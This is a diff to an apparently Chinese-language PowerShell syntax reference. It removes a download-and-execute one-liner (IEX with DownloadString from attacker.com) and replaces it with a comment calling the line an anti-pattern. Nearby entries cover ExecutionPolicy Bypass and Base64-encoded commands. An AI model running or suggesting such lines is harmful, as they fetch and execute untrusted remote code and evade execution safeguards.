@@ -18,7 +18,8 @@ powershell -ExecutionPolicy Bypass -File script.ps1
 > 从远程下载并执行脚本
 _platform: windows_
 ```
-IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")  # security-allowlist: SEC005
+# Historical anti-pattern: downloading mutable script text and evaluating it dynamically.
+# Do not execute remote text; inspect a pinned HTTPS source locally first.
 ```
 **语法解析：**
 - `IEX` — Invoke-Expression，执行字符串 _command_ <!-- security-allowlist: SEC004 -->
@@ -26,7 +27,7 @@ IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1") 
 - `DownloadString` — 下载字符串内容 _value_
 
 **Step 0**
-> 使用Base64编码执行命令
+> 使用Base64编码执行命令（Windows PowerShell -EncodedCommand 需要 UTF-16LE 字节的 Base64，并非 UTF-8）
 _platform: windows_
 ```
 powershell -EncodedCommand BASE64_ENCODED_COMMAND
